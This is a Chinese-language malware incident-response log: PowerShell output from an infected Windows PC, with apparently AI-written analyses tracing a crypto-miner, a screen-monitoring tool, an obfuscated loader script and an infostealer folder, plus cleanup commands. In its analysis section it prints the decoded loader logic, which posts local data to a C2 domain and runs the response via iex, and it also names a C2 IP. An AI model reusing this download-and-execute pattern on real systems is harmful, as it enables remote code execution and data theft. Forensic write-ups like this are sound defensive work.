deviceTRUST Client User                                  "C:\PROGRA~2\Citrix\DEVICE~1\Bin64\DTCLIE~1.EXE"                                           HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
GlobalProtect                                            "C:\Program Files\Palo Alto Networks\GlobalProtect\PanGPA.exe"                             HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Autodesk Access                                          "C:\Program Files\Autodesk\AdODIS\V1\Access\AdskAccessCore.exe" --minimizedUi --autoLaunch HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
KeePass 2 PreLoad                                        "d:\Program Files\KeePass Password Safe 2\KeePass.exe" --preload                           HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run


PS C:\Windows\system32>
>> reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    OneDrive    REG_SZ    "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background
    QQNT    REG_SZ    "C:\Program Files\Tencent\QQNT\QQ.exe" /background
    BaiduYunDetect    REG_SZ    "E:\Users\SW\baidupan\BaiduNetdisk\YunDetectService.exe"
    electron.app.BlueStacks Services    REG_SZ    C:\Users\SW\AppData\Local\Programs\bluestacks-services\BlueStacksServices.exe --hidden
    GameViewer    REG_SZ    "d:\Program Files\Netease\GameViewer\GameViewer.exe" --auto-run
    org.yuanli.utools    REG_SZ    C:\Users\SW\AppData\Local\Programs\utools\uTools.exe
    ApifoxAppAgent    REG_SZ    C:\Users\SW\AppData\Roaming\apifox\ApifoxAppAgent.exe
    MicrosoftEdgeAutoLaunch_EAC260E2A74ACFAE0CFBB48BD28C7021    REG_SZ    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start

PS C:\Windows\system32>
>> reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    SunloginClient    REG_SZ    "C:\Program Files\Oray\SunLogin\SunloginClient\SunloginClient.exe" --cmd=autorun
    Sysdiag    REG_SZ    "d:\Program Files\Huorong\Sysdiag\bin\HipsTray.exe"
    Autodesk Access Service    REG_SZ    "C:\Program Files\Autodesk\AdODIS\V1\Setup\AdskAccessService.exe" --autoLaunch
    deviceTRUST Client User    REG_SZ    "C:\PROGRA~2\Citrix\DEVICE~1\Bin64\DTCLIE~1.EXE"
    GlobalProtect    REG_SZ    "C:\Program Files\Palo Alto Networks\GlobalProtect\PanGPA.exe"
    Autodesk Access    REG_SZ    "C:\Program Files\Autodesk\AdODIS\V1\Access\AdskAccessCore.exe" --minimizedUi --autoLaunch
    KeePass 2 PreLoad    REG_SZ    "d:\Program Files\KeePass Password Safe 2\KeePass.exe" --preload

PS C:\Windows\system32>
>> schtasks /query /fo LIST /v | findstr /i "Crisp srv_runtime Razor Runner"
??????:                       %windir%\system32\compattelrunner.exe
??????:                       %windir%\system32\compattelrunner.exe
??????:                       %windir%\system32\compattelrunner.exe
??????:                       %windir%\system32\compattelrunner.exe -maintenance
PS C:\Windows\system32>
>> wmic service get name,displayname,pathname,startmode | findstr /i "Crisp srv_runtime Razor Runner"
PS C:\Windows\system32> Test-Path "C:\Users\SW\srv_runtime_v9_rtm"
False
PS C:\Windows\system32>
>> Test-Path "C:\ProgramData\srv_runtime_v9_rtm"
False
PS C:\Windows\system32>
PS C:\Windows\system32>
PS C:\Windows\system32>
>>
>> Get-ChildItem "$env:TEMP","$env:LOCALAPPDATA","$env:APPDATA","C:\ProgramData" -Recurse -ErrorAction SilentlyContinue |
>>
>> Where-Object {$_.FullName -match "Crisp|srv_runtime|Razor|Runner"} |
>> Select-Object FullName, Length, CreationTime, LastWriteTime
>> 

```


## 清除基本完成，环境已干净

### 扫描结果分析

**所有匹配到的文件都是无害的**，全部是正常软件的组成部分：

- Chrome 扩展图标文件（Crisp Live Chat、Razorpay、RoadRunner 等都是合法的 SaaS 服务图标）
- npm 缓存中的 playwright / openai 库文件
- VS Code 文件类型图标

**没有发现恶意残留。**

其他确认项也全部干净：矿池连接已断开、两个恶意目录已删除、无恶意服务注册。

---

### 还差最后一步

`UIThread_net48_i386` 计划任务可能还没删（之前的 `schtasks` 搜索关键字没覆盖到它）：

```powershell
# 确认并删除
schtasks /query /tn "UIThread_net48_i386" 2>$null && schtasks /delete /tn "UIThread_net48_i386" /f
```

---

### 本次事件完整总结

| 组件 | 类型 | 位置 | 状态 |
|---|---|---|---|
| Crisp.exe | 加密货币挖矿木马 | `C:\Users\SW\srv_runtime_v9_rtm\` | ✅ 已清除 |
| Runner-Razor.exe | 屏幕监控/远控 | `C:\ProgramData\srv_runtime_v9_rtm\` | ✅ 已清除 |
| 矿池连接 | C2通信 | `91.199.163.124:3333/3334` | ✅ 已断开 |
| UIThread_net48_i386 | 持久化计划任务 | 任务计划程序根目录 | ⚠️ 执行上面命令确认 |

### 善后建议

1. **修改密码** — Runner-Razor 从3月30日起就在运行，具备屏幕捕获能力，期间登录过的所有账户（浏览器、邮箱、工作系统）都应该改密码
2. **火绒全盘扫描** — 做一次收尾确认
3. **注意向日葵** — 你机器上装了 SunloginClient，如果这也不是你自己装的，需要警惕
4. **溯源** — 回忆一下那条 PowerShell 命令是从哪里来的，避免再次中招。同时3月30日之前是否也执行过类似的东西，因为 Runner-Razor 比今天的挖矿木马早了4天部署

-------------------------

### 继续排查根源

```bat
PS C:\Windows\system32> Get-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -TaskName "Teakettlesers" | Select-Object *
State                 : Disabled
Actions               : {MSFT_TaskExecAction}
Author                :
Date                  :
Description           : underexperienceal fellowshipality gravitatingtions legitimacys zoolatriessarians nonporterible
Documentation         :
Principal             : MSFT_TaskPrincipal2
SecurityDescriptor    :
Settings              : MSFT_TaskSettings3
Source                :
TaskName              : Teakettlesers
TaskPath              : \Tantalizedment\Greenhousing\
Triggers              : {MSFT_TaskTimeTrigger}
URI                   : \Tantalizedment\Greenhousing\Teakettlesers
Version               :
PSComputerName        :
CimClass              : Root/Microsoft/Windows/TaskScheduler:MSFT_ScheduledTask
CimInstanceProperties : {Actions, Author, Date, Description...}
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties
PS C:\Windows\system32> (Get-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -TaskName "Teakettlesers").Actions | Format-List
Id               :
Arguments        : -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\ProgramData\Decipheringizations\thermionical.ps1
Execute          : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
WorkingDirectory :
PSComputerName   :
PS C:\Windows\system32>
```



## 找到了！这很可能是整个攻击链的源头

### 分析

这个计划任务比之前发现的都更危险：

| 特征        | 值                                                       | 含义                                          |
| ----------- | -------------------------------------------------------- | --------------------------------------------- |
| 任务路径    | `\Tantalizedment\Greenhousing\`                          | 随机拼凑的假词，典型的恶意软件自动生成        |
| Description | `underexperienceal fellowshipality...`                   | 同样是随机废话，用于混淆                      |
| 执行参数    | `-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden` | 绕过安全策略 + 隐藏窗口，经典恶意载荷执行方式 |
| 载荷        | `C:\ProgramData\Decipheringizations\thermionical.ps1`    | 隐藏的 PowerShell 脚本                        |
| 触发器      | `MSFT_TaskTimeTrigger`                                   | 定时执行                                      |
| 状态        | Disabled                                                 | 可能已经完成任务后自行禁用                    |

**这就是下载 Runner-Razor 和 Crisp.exe 的 loader。** 它通过定时触发执行隐藏的 PS1 脚本来投递恶意载荷。

------

### 先取证，再清除

那个 PS1 脚本是关键证据，看看它具体做了什么：

```powershell
# 1. 查看 loader 脚本内容（先别删！）
Get-Content "C:\ProgramData\Decipheringizations\thermionical.ps1"

# 2. 查看整个目录下还有什么
Get-ChildItem "C:\ProgramData\Decipheringizations" -Recurse -Force

# 3. 查看文件创建时间（定位最初感染时间）
Get-Item "C:\ProgramData\Decipheringizations" | Select-Object FullName, CreationTime
Get-Item "C:\ProgramData\Decipheringizations\thermionical.ps1" | Select-Object FullName, Length, CreationTime, LastWriteTime

# 4. 查看计划任务的触发器详情
(Get-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -TaskName "Teakettlesers").Triggers | Format-List *
```

把这些结果发给我。PS1 脚本的内容能帮我们搞清楚：攻击者从哪里下载载荷、怎么做的持久化、以及是否还有我们没发现的组件。



----------------------

文件太大，中间被截断了。让我看看关键部分：找到核心载荷了。让我解码：# 完整攻击链解码结果

这个 618KB、6255 行的脚本中，99% 是随机废话用来混淆。实际恶意逻辑只有约 15 行，解码后的攻击流程如下：

## thermionical.ps1文件分析

### 解码后的关键变量

| 混淆变量                   | 实际值                                                       |
| -------------------------- | ------------------------------------------------------------ |
| `$iyyAkbkA5gC`             | `https://nonacquireish.com/vPoaNAdL.../ZmymvCZ...html?J2UaGxmSGokftIa2A=` |
| `$PgRn5Q2x9vW7L0KDL`       | `C:\ProgramData\Decipheringizations`                         |
| `$U9UBw7WHoMOK`            | `ZmymvCZpbhQGTvMQpGvikokTkYYfoL`                             |
| `$I6Vdbzt7VxV7zJNkaGIjIKh` | **`Invoke-RestMethod`**                                      |
| `$Y4kpvaJN1CJy`            | **`iex`**（Invoke-Expression）                               |
| `$GbdFgnxRuSlnj`           | `J2UaGxmSGokftIa2A`（POST 参数名）                           |

### 还原后的攻击逻辑

```powershell
# 1. 检查本地落点目录是否存在
if (Test-Path "C:\ProgramData\Decipheringizations") {

    # 2. 读取本地状态文件
    $fileContent = Get-Content "C:\ProgramData\Decipheringizations\ZmymvCZ..." -Raw

    # 3. 通过 POST 将本地文件内容回传给 C2，并下载新指令
    $response = Invoke-RestMethod "https://nonacquireish.com/...&rnd=随机数" -Method POST -Body @{ J2UaGxmSGokftIa2A = $fileContent }

    # 4. 删除本地状态文件（反取证）
    Remove-Item "C:\ProgramData\Decipheringizations\ZmymvCZ..."

    # 5. 如果 C2 返回了新载荷，直接用 iex 执行！
    if ($response.Length -gt 1) {
        iex($response)    # ← 执行从 C2 下载的任意代码
    }
}
```

### 攻击链总结

这是一个**多阶段持久化攻击框架**：

1. **计划任务 `Teakettlesers`** 定时触发 → 执行 `thermionical.ps1`
2. `thermionical.ps1` 作为 **loader**，连接 C2 服务器 `nonacquireish.com`
3. C2 返回什么就执行什么（`iex`），这就是 Runner-Razor 和 Crisp.exe 的投递方式
4. 每次执行后删除本地痕迹文件

### 立即清除

```powershell
# 1. 删除恶意计划任务
Unregister-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -TaskName "Teakettlesers" -Confirm:$false

# 2. 删除 loader 目录
Remove-Item -Path "C:\ProgramData\Decipheringizations" -Recurse -Force

# 3. 确认清除
Test-Path "C:\ProgramData\Decipheringizations"
Get-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -ErrorAction SilentlyContinue
```

这是整个攻击的根源。清除这个之后，攻击者就失去了重新投递载荷的能力。但关键问题仍然是——**最初是怎么感染的？** 这个计划任务和 `Decipheringizations` 目录是什么时候创建的？如果你还没执行过之前我给的创建时间检查命令，建议确认一下。





### 还有几件事需要确认。

请执行以下命令：

```powershell
# 1. 清除 loader 计划任务和目录
Unregister-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -TaskName "Teakettlesers" -Confirm:$false
Remove-Item -Path "C:\ProgramData\Decipheringizations" -Recurse -Force -ErrorAction SilentlyContinue

# 2. 确认清除
Test-Path "C:\ProgramData\Decipheringizations"
Get-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -ErrorAction SilentlyContinue

# 3. 排查是否还有其他类似的随机词计划任务目录（攻击者可能不止种了一个）
Get-ScheduledTask | Where-Object {
    $_.TaskPath -notlike "\Microsoft\*" -and
    $_.TaskPath -ne "\" -and
    $_.TaskPath -notlike "\GoogleSystem\*"
} | Select-Object TaskPath, TaskName, State | Format-List

# 4. 检查 DNS 缓存中是否有 C2 域名记录
Get-DnsClientCache | Where-Object {
    $_.Entry -like "*nonacquireish*" -or
    $_.Entry -like "*underperformize*"
}

# 5. 查看 Decipheringizations 目录的创建时间（如果还没删的话先查）
# 如果已经删了就跳过这条
Get-Item "C:\ProgramData\Decipheringizations" -ErrorAction SilentlyContinue | Select-Object CreationTime

# 6. 全面扫描 ProgramData 下是否有类似的随机命名目录
Get-ChildItem "C:\ProgramData" -Directory | Where-Object {
    $_.Name -notmatch '^(Microsoft|Adobe|Apple|Package|chocolatey|ssh|123SyncCloud|Lenovo|VMware|Packages|USOPrivate|USOShared|regid|Comms|Intel)' -and
    $_.Name.Length -gt 15
} | Select-Object Name, CreationTime | Sort-Object CreationTime
```

第 3 步特别重要——攻击者在 `\Tantalizedment\Greenhousing\` 这种随机路径下藏了计划任务，可能还有其他类似的。第 6 步也很关键，`Decipheringizations` 这种长随机词目录名可能还有同类。

----------------

### chatgpt分析该文件

我看了你上传的 `thermionical.ps1`。

结论很明确：**这是恶意 PowerShell 后门/下载执行脚本，不是正常脚本。** 它也和你日志里发现的计划任务 `\Tantalizedment\Greenhousing\Teakettlesers` 对上了。

它的核心行为，我已经能还原出来：

- 脚本用大量**垃圾变量名**和**算术拼字符**做混淆。
- 它解码出了目录：
  - `C:\ProgramData\Decipheringizations`
- 它解码出了调用命令：
  - `Invoke-RestMethod`
- 它解码出了一个固定远程地址，域名是：
  - `nonacquireish.com`
- 它会拼出本地文件路径：
  - `C:\ProgramData\Decipheringizations\ZmymvCZpbhQGTvMQpGvikokTkYYfoL`
- 如果这个文件存在，它会：
  1. 读取这个文件内容
  2. 用 `Invoke-RestMethod` 发到远端
  3. 收到特定响应后删除本地文件
  4. 再向同一地址拉取内容
  5. 最后用 `iex` 直接执行返回结果

最关键的一句，就是脚本最后这段逻辑本质上等于：

```powershell
$response = Invoke-RestMethod <远程地址>
iex($response)
```

这意味着它不是单纯“上传一点信息”，而是**能从远端拿第二阶段载荷并在你机器上直接执行**。

所以这个脚本的性质可以定为：

**带持久化的远程控制/下载执行脚本，兼有数据回传能力。**

结合你前面的证据，现在链条已经很完整了：

- 混淆 PowerShell 下载执行
- 落地 `Crisp.exe` 并外连
- 隐藏计划任务调用 `thermionical.ps1`
- `thermionical.ps1` 再继续联网、回传、拉取并 `iex` 执行

这已经不是“可能中招”，而是**已经被成功执行过的恶意链**。

现在建议直接按这个顺序处理：

```powershell
Unregister-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -TaskName "Teakettlesers" -Confirm:$false

Remove-Item "C:\ProgramData\Decipheringizations\thermionical.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\ProgramData\Decipheringizations" -Recurse -Force -ErrorAction SilentlyContinue
```

然后再补查同类残留：

```powershell
Get-ScheduledTask | ForEach-Object {
    try {
        foreach ($a in $_.Actions) {
            [PSCustomObject]@{
                TaskPath  = $_.TaskPath
                TaskName  = $_.TaskName
                Execute   = $a.Execute
                Arguments = $a.Arguments
                State     = $_.State
            }
        }
    } catch {}
} | Where-Object {
    $_.Execute -match "powershell" -or
    $_.Arguments -match "Bypass|Hidden|thermionical|Decipheringizations|iex|Invoke-RestMethod"
} | Format-List
```

再查残留文件：

```powershell
Get-ChildItem "C:\ProgramData","$env:APPDATA","$env:LOCALAPPDATA","$env:TEMP" -Recurse -ErrorAction SilentlyContinue |
Where-Object {
    $_.FullName -match "Decipheringizations|thermionical|Tantalizedment|Greenhousing|Teakettlesers|ZmymvCZpbhQGTvMQpGvikokTkYYfoL"
} | Select-Object FullName,Length,CreationTime,LastWriteTime
```

我对后续处置的建议也更明确一点：

**这台机器建议重装系统。**

因为现在已经确认它具备：

- 持久化
- 远程取指令
- 二次执行
- 可能的数据回传

只靠“删文件 + 删任务”不能保证没有别的二阶段残留。

另外，重要账号也建议马上处理：

- 用另一台干净设备改邮箱密码
- 改浏览器里保存过的密码
- 改公司 VPN / Citrix / 远程办公账号
- 开启或重置 MFA

如果你愿意，我下一步可以直接帮你把这个 `thermionical.ps1` 再整理成一份**更短的 IOC 清单**，包括域名、目录、文件名、任务名、可直接搜索和封禁的特征。

----------------

## 找到C:\ProgramData目录下其它可疑目录

![image-20260404145341488](pics\image-20260404145341488.png)



![image-20260404145501971](pics\image-20260404145501971.png)







```bat
PS C:\Windows\system32> Get-ChildItem "C:\ProgramData\Decipheringizations" -Recurse -Force 
 
 
    目录: C:\ProgramData\Decipheringizations 
 
 
Mode                 LastWriteTime         Length Name 
----                 -------------         ------ ---- 
-a----          2026/4/3     14:14         617899 thermionical.ps1 
 
 
PS C:\Windows\system32> Get-Item "C:\ProgramData\Decipheringizations" | Select-Object FullName, CreationTime 
 
FullName                           CreationTime 
--------                           ------------ 
C:\ProgramData\Decipheringizations 2026/4/3 14:14:40 
 
 
PS C:\Windows\system32> Get-Item "C:\ProgramData\Decipheringizations\thermionical.ps1" | Select-Object FullName, Length, CreationTime, LastWriteTime 
 
FullName                                            Length CreationTime      LastWriteTime 
--------                                            ------ ------------      ------------- 
C:\ProgramData\Decipheringizations\thermionical.ps1 617899 2026/4/3 14:14:40 2026/4/3 14:14:40 
 
 
PS C:\Windows\system32> (Get-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -TaskName "Teakettlesers").Triggers | Format-List * 
 
 
Enabled               : True 
EndBoundary           : 
ExecutionTimeLimit    : 
Id                    : 
Repetition            : MSFT_TaskRepetitionPattern 
StartBoundary         : 2026-04-03T14:24:40 
RandomDelay           : 
PSComputerName        : 
CimClass              : Root/Microsoft/Windows/TaskScheduler:MSFT_TaskTimeTrigger 
CimInstanceProperties : {Enabled, EndBoundary, ExecutionTimeLimit, Id...} 
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties 
 
 
 
PS C:\Windows\system32> 
 
 
 
PS C:\Windows\system32> Unregister-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -TaskName "Teakettlesers" -Confirm:$false 
PS C:\Windows\system32> Remove-Item -Path "C:\ProgramData\Decipheringizations" -Recurse -Force 
PS C:\Windows\system32> Test-Path "C:\ProgramData\Decipheringizations" 
False 
PS C:\Windows\system32> Get-ScheduledTask -TaskPath "\Tantalizedment\Greenhousing\" -ErrorAction SilentlyContinue 
PS C:\Windows\system32> 
 
PS C:\Windows\system32> Get-ScheduledTask | ForEach-Object { 
>> try { 
>> foreach ($a in $_.Actions) { 
>> [PSCustomObject]@{ 
>> TaskPath  = $_.TaskPath 
>> TaskName  = $_.TaskName 
>> Execute   = $a.Execute 
>> Arguments = $a.Arguments 
>> State     = $_.State 
>> } 
>> } 
>> } catch {} 
>> } | Where-Object { 
>> $_.Execute -match "powershell" -or 
>> $_.Arguments -match "Bypass|Hidden|thermionical|Decipheringizations|iex|Invoke-RestMethod" 
>> } | Format-List 
PS C:\Windows\system32> 
PS C:\Windows\system32> Get-ChildItem "C:\ProgramData","$env:APPDATA","$env:LOCALAPPDATA","$env:TEMP" -Recurse -ErrorAction SilentlyContinue | 
>> Where-Object { 
>> $_.FullName -match "Decipheringizations|thermionical|Tantalizedment|Greenhousing|Teakettlesers|ZmymvCZpbhQGTvMQpGvikokTkYYfoL" 
>> } | Select-Object FullName,Length,CreationTime,LastWriteTime 
PS C:\Windows\system32> 
PS C:\Windows\system32>
```







## `Paliz` 目录高度可疑，需要立即排查

### 按时间线分析今天创建的 ProgramData 目录

| 目录                        | 创建时间  | 判断                                                  |
| --------------------------- | --------- | ----------------------------------------------------- |
| VMware                      | 9:22      | ✅ 正常，你装了 VMware                                 |
| Mozilla-1de4eec8...         | 9:33      | ✅ 正常，Firefox/Thunderbird 更新相关                  |
| **Paliz**                   | **14:16** | ⚠️ **高度可疑 — 在 loader 落地 (14:14) 后 2 分钟创建** |
| boost_interprocess          | 14:59     | ⚠️ 需确认，可能是 Crisp.exe 挖矿进程的共享内存         |
| regid.1991-06.com.microsoft | 16:00     | ✅ 正常，Microsoft SWID 标签目录                       |

### `Paliz` 几乎确定是恶意的

- 创建时间 **14:16**，恰好在 thermionical.ps1 (14:14) 和 Crisp.exe (14:15) 之后
- 子目录和文件全部是**随机无意义词**：`mespcragloi`、`Vuwot`、`Bisefuk`、`Boyetosa`、`Yubemuc`
- 文件没有扩展名，大小在 3-22KB — 典型的恶意软件配置/数据文件

请执行：

```powershell
# 1. 查看 Paliz 完整内容
Get-ChildItem "C:\ProgramData\Paliz" -Recurse -Force | Select-Object FullName, Length, CreationTime, LastWriteTime

# 2. 查看无扩展名文件内容（取前几百字节看看是什么）
Get-Content "C:\ProgramData\Paliz\Bisefuk" -TotalCount 5
Get-Content "C:\ProgramData\Paliz\Boyetosa" -TotalCount 5
Get-Content "C:\ProgramData\Paliz\Yubemuc" -TotalCount 5

# 3. 检查 boost_interprocess 是否关联挖矿进程（Crisp 已被杀，如果这目录是它创建的应该没活跃进程了）
Get-ChildItem "C:\ProgramData\boost_interprocess" -Recurse -Force | Select-Object FullName, Length, CreationTime

# 4. 检查是否有进程正在使用 Paliz 目录下的文件
Get-Process | ForEach-Object {
    try { $_.Modules } catch {} 
} | Where-Object { $_.FileName -like "*Paliz*" } | Select-Object FileName
```

如果 Bisefuk/Boyetosa/Yubemuc 的内容是乱码或 base64 编码数据，那就确认是恶意载荷的数据文件，直接整个 `Paliz` 目录删除。



## 确认：`Paliz` 是信息窃取木马（InfoStealer）的数据目录

### 关键证据

**三个大文件的熵值接近 8.0（完美随机），确认是加密数据：**

| 文件     | 大小     | 熵值 | 含义                                            |
| -------- | -------- | ---- | ----------------------------------------------- |
| Bisefuk  | 22,374 B | 7.99 | 加密的被盗数据（最大，可能是浏览器密码/Cookie） |
| Yubemuc  | 16,141 B | 7.99 | 加密的被盗数据                                  |
| Boyetosa | 2,377 B  | 7.91 | 加密的被盗数据（较小，可能是系统信息）          |

**`Vuwot` 目录中 SHA1 哈希命名的小文件包含用户标识：**

- `17d9ca7e...` → 解码后包含 **"SW"** — 这是你的 Windows 用户名
- `a9c1eb69...` → 解码后包含 **"ST"**
- 其他文件包含加密的索引/配置数据

**`mespcragloi` 目录下两个 92 字节文件** — 加密密钥或 C2 配置

### 这意味着什么

这不仅仅是挖矿和屏幕监控 — **攻击者同时部署了信息窃取木马**。根据文件结构（SHA1 哈希命名、加密数据分块存储、用户名标识），这符合 **Lumma Stealer / Vidar** 类 InfoStealer 的特征。

它很可能已经窃取了：

- 所有浏览器保存的密码和自动填充数据
- 浏览器 Cookie 和会话令牌
- 加密货币钱包文件
- 系统凭据信息

**数据大概率已经回传给了攻击者**（loader 通过 `Invoke-RestMethod` POST 方式与 C2 通信）。本地这些文件可能只是尚未清理的残留。

### 立即执行

```powershell
# 1. 删除 InfoStealer 数据目录
Remove-Item -Path "C:\ProgramData\Paliz" -Recurse -Force

# 2. 删除 boost_interprocess（Crisp 挖矿进程的 IPC 残留）
Remove-Item -Path "C:\ProgramData\boost_interprocess" -Recurse -Force

# 3. 确认
Test-Path "C:\ProgramData\Paliz"
Test-Path "C:\ProgramData\boost_interprocess"
```

### 紧急安全行动 — 必须立即做

这次发现将事件严重程度大幅提升。之前我们说"建议改密码"，现在是**必须立刻改**：

1. **所有浏览器保存的密码** — 全部视为已泄露，逐个更改。优先级：邮箱 > 银行/支付 > 工作系统 > 社交账号
2. **浏览器登录的会话** — 在所有网站上执行"注销所有设备"操作，因为攻击者可能拿到了你的 Cookie，改密码不一定能让旧 Cookie 失效
3. **如果有加密货币** — 立即将资产转移到新钱包
4. **KeePass 数据库** — 你机器上装了 KeePass，如果 KeePass 在攻击期间是解锁状态，数据库内容可能被 Runner-Razor 的屏幕截取捕获
5. **工作系统凭据** — Rancher、服务器 SSH 密钥、数据库密码全部轮换



### 清理日志

```bat
# 1. 删除 InfoStealer 数据目录
Remove-Item -Path "C:\ProgramData\Paliz" -Recurse -Force

# 2. 删除 boost_interprocess（Crisp 挖矿进程的 IPC 残留）
Remove-Item -Path "C:\ProgramData\boost_interprocess" -Recurse -Force

# 3. 确认
Test-Path "C:\ProgramData\Paliz"
Test-Path "C:\ProgramData\boost_interprocess"
```

------------------

### 无法清理Paliz文件夹

```bat
PS C:\Windows\system32> Remove-Item -Path "C:\ProgramData\Paliz" -Recurse -Force
Remove-Item : 无法删除项 C:\ProgramData\Paliz: 文件“C:\ProgramData\Paliz”正由另一进程使用，因此该进程无法访问此文件。
所在位置 行:1 字符: 1
+ Remove-Item -Path "C:\ProgramData\Paliz" -Recurse -Force
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : WriteError: (C:\ProgramData\Paliz:DirectoryInfo) [Remove-Item], IOException
    + FullyQualifiedErrorId : RemoveFileSystemItemIOError,Microsoft.PowerShell.Commands.RemoveItemCommand
```

--------

#### 使用工具分析是什么占用了Paliz

#### InfoStealer 可能注入了合法进程

进程列表中没有明显的可疑路径，说明窃密程序可能通过**进程注入**藏在了某个系统进程中。注意到 `powershell` PID 168360（14:24:11启动）仍在运行——它可能就是执行 thermionical.ps1 后通过 `iex` 加载了 InfoStealer 代码并持续占用 Paliz 目录。

请执行以下命令定位锁定进程：

```powershell
# 方法1：用 handle 工具查找（最精确）
# 先下载 Sysinternals Handle
Invoke-WebRequest -Uri "https://live.sysinternals.com/handle64.exe" -OutFile "$env:TEMP\handle64.exe"
& "$env:TEMP\handle64.exe" -accepteula "Paliz" 2>$null

# 方法2：如果上面下载失败（断网了），检查可疑的 PowerShell 进程
Get-Process powershell | Select-Object Id, StartTime, Path
Get-Process powershell | ForEach-Object {
    $wmi = Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)"
    [PSCustomObject]@{
        PID = $_.Id
        StartTime = $_.StartTime
        CommandLine = $wmi.CommandLine
        ParentPID = $wmi.ParentProcessId
    }
} | Format-List

# 方法3：直接尝试杀掉14:24启动的 PowerShell（就是执行 loader 的那个）
# 先确认再杀
Get-Process -Id 168360 -ErrorAction SilentlyContinue | Select-Object Id, Name, StartTime
```

如果确认 PID 168360 就是 14:24 启动的那个 PowerShell，直接杀掉它然后再删 Paliz：

```powershell
Stop-Process -Id 168360 -Force
Start-Sleep -Seconds 2
Remove-Item -Path "C:\ProgramData\Paliz" -Recurse -Force
Test-Path "C:\ProgramData\Paliz"
```



#### chatgpt分析占用情况

这份进程列表里，**没有看到明显“从 `C:\ProgramData\Paliz` 直接运行”的进程**。

也就是说，现在的情况更像是：

- **不是**某个可执行文件正从 `Paliz` 目录启动
- **而是**有某个进程持有了这个目录或其中某个文件的句柄，所以你删目录时报“被另一进程使用”

常见会占用目录的有这几类：

- 资源管理器正在打开这个目录
- `Everything` 正在索引
- 杀毒/防护软件正在扫描，比如你这里的 `HipsMain`
- 还有一种可能是恶意进程本体在别处，但把句柄留在了 `Paliz`

你这份列表里，比较值得先怀疑的不是 Chrome/Edge/Firefox，而是：

- `everything.exe`
- `HipsMain.exe`
- `explorer.exe`

先做最省事的处理：

1. 关掉所有打开到 `C:\ProgramData`、`Paliz` 的资源管理器窗口
2. 退出 `Everything`
3. 暂时退出火绒实时防护/文件监控
4. 再删一次 `Paliz`

可以直接试：

```powershell
taskkill /IM everything.exe /F
taskkill /IM explorer.exe /F
Start-Process explorer.exe
Remove-Item "C:\ProgramData\Paliz" -Recurse -Force
```

如果还删不掉，就用更准确的方法查谁占用。

**方法一：资源监视器**

- `Win + R`
- 输入 `resmon`
- 打开“CPU”
- 在“关联的句柄”里搜索 `Paliz`

**方法二：Sysinternals handle**
如果你有 `handle64.exe`：

```powershell
handle64.exe Paliz
```

它会直接告诉你哪个 PID 占用了它。查到 PID 后：

```powershell
Stop-Process -Id <PID> -Force
Remove-Item "C:\ProgramData\Paliz" -Recurse -Force
```

如果你现在想最快处理，不再细查：

**断网后重启进安全模式，再删 `C:\ProgramData\Paliz`**，成功率最高。

再说一个重要判断：
你这份进程清单里虽然没出现 `Paliz` 路径本体，但**这不能证明 `Paliz` 安全**，只说明“占用它的进程可执行文件路径不在 `Paliz` 下面”。所以 `Paliz` 仍然应该继续删除或隔离。

下一步最有价值的是把这两个结果发我：

```powershell
Get-Process | Where-Object { $_.Path -like "*Paliz*" } | Select-Object Name,Id,Path
```

以及如果你能跑：

```powershell
handle64.exe Paliz
```

只要拿到占用它的 PID，基本就能定点清掉。

## 清除完成 — 完整事件总结

### 攻击时间线

| 时间              | 事件                                                         |
| ----------------- | ------------------------------------------------------------ |
| **3月30日 9:29**  | Runner-Razor 间谍工具部署到 `C:\ProgramData\srv_runtime_v9_rtm\` |
| **3月30日 9:29**  | 计划任务 `UIThread_net48_i386` 创建（每次登录启动 Runner-Razor） |
| **4月3日 14:14**  | thermionical.ps1 loader 落地到 `Decipheringizations`         |
| **4月3日 14:14**  | 计划任务 `Teakettlesers` 创建（定时触发 loader）             |
| **4月3日 14:15**  | Crisp.exe 挖矿木马落地并连接矿池 `91.199.163.124:3333/3334`  |
| **4月3日 14:16**  | Paliz InfoStealer 数据目录创建，开始窃取浏览器凭据           |
| **4月3日 14:24**  | loader 计划任务首次触发，通过 C2 (`nonacquireish.com`) 下载并 `iex` 执行载荷 |
| **4月3日 ~15:00** | 你发现异常，开始排查                                         |

### 已清除的恶意组件（全部 ✅）

| 组件                | 类型                        | 状态                  |
| ------------------- | --------------------------- | --------------------- |
| Crisp.exe           | 加密货币挖矿                | ✅ 进程终止 + 文件删除 |
| Runner-Razor.exe    | 屏幕监控/远控               | ✅ 文件删除            |
| thermionical.ps1    | C2 Loader（6255行混淆脚本） | ✅ 文件删除            |
| Paliz 目录          | InfoStealer 数据存储        | ✅ 进程终止 + 目录删除 |
| UIThread_net48_i386 | 持久化计划任务              | ✅ 已注销              |
